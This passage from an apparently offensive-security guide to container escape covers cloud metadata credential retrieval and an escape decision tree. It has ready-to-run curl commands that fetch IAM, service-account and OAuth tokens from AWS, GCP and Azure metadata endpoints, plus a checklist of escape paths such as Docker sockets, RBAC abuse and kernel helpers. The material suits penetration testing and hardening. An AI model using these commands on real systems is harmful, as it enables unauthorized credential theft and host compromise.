malicious Dockerfile or image config
malicious OCI config
runtime exec into attacker-controlled container
CI image build pipeline
shared Kubernetes node running untrusted images

15. Cloud metadata from containers

Metadata is not a container escape by itself, but it often becomes the next boundary.

Check cloud hints:

env | grep -Ei 'AWS|AZURE|GOOGLE|GCP'
ip route
cat /etc/resolv.conf

AWS IMDS:

curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null

IMDSv2 token attempt:

TOKEN=$(curl -s --max-time 2 -X PUT \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  http://169.254.169.254/latest/api/token)

curl -s --max-time 2 \
  -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

GCP metadata:

curl -s --max-time 2 -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

Azure metadata:

curl -s --max-time 2 -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

Questions that matter:

is metadata reachable from pod
is the credential node-level or workload-level
can it create stronger compute
can it read secrets
can it write registry or deployment artifacts
can it pass roles

Failure gates:

IMDS blocked by network policy or hop limit
IMDSv2 required and SSRF path cannot set token header
workload identity scoped correctly
metadata proxy enforces pod identity
cloud role read-only

16. Decision tree

Use this as the second-monitor flow.

1. Runtime socket?
   docker.sock -> Docker API path
   containerd.sock -> ctr or crictl path
   crio.sock -> crictl path

2. Host filesystem mounted?
   RW / -> direct node file primitive
   RW /etc/kubernetes/manifests -> static pod
   RO /var/lib/kubelet -> secrets and tokens
   socket under host mount -> runtime path

3. Kubernetes service account?
   can create pods -> dry-run bad pod
   can create daemonsets -> multi-node path
   can get/list secrets -> token and secret path
   can create serviceaccounts/token -> mint path
   can nodes/proxy -> kubelet API path
   can bind/escalate/impersonate -> RBAC escalation path

4. Privileged or dangerous caps?
   CAP_SYS_ADMIN -> cgroups, mount, namespace, helper family
   CAP_SYS_MODULE -> kernel module path
   CAP_SYS_PTRACE + hostPID -> process path
   CAP_DAC_READ_SEARCH + host mount -> file read path

5. Writable kernel helper?
   core_pattern -> crash handler
   release_agent -> cgroup empty trigger
   modprobe -> auto-load trigger
   uevent_helper -> uevent trigger
   binfmt_misc -> interpreter registration

6. Namespace exposure?
   hostPID -> /proc/<pid>/root and process visibility
   hostNetwork -> node-local services
   hostIPC -> shared IPC objects
   host mount namespace -> direct mount view

7. User namespace?
   root maps to host root -> normal impact
   root maps to subuid -> adjust expectations
   rootless runtime -> daemon control is user-level, not host-root

8. Runtime CVE?
   verify version
   verify vendor patch
   verify trigger path
   verify attacker controls image, cwd, exec, or bind source

9. CI or cloud credentials?
   Docker socket in job -> runtime path
   privileged build -> kernel helper path
   cloud role -> create stronger execution context
   registry push -> supply-chain path

High-priority hits:

rootful Docker socket
containerd or CRI socket with host mount or privileged creation
read-write host root
read-write /etc/kubernetes/manifests
service account can create privileged hostPath pods
service account can create DaemonSets with weak admission
nodes/proxy with kubelet API reachability
CAP_SYS_MODULE
CAP_SYS_ADMIN plus writable cgroupfs
privileged container plus writable core_pattern
runc CVE with reachable run or exec trigger
CI job with Docker socket and deployment credentials
cloud role that can start privileged build or compute

Low-priority by itself:

uid=0 with no caps, seccomp on, no host mount, no token
read-only app config mount with no secrets
service account with discovery-only permissions
old runtime version with confirmed vendor backport
CAP_NET_RAW alone in an otherwise confined container

17. The boundary map

The container is only one boundary.

The useful map is:

process
container namespace
container runtime
node filesystem
kubelet
Kubernetes API
cloud metadata
CI runner
registry
deployment system

Most failed attempts come from attacking the wrong layer.

Nimbus looked like a worker escape until it became a build-system escape. Docker socket issues look like file mounts until you treat the socket as the runtime API. hostPath looks like storage until it includes kubelet state. Kubernetes RBAC looks like permissions until admission accepts a node-level pod.

The practical question stays the same:

what can this workload make something else do?
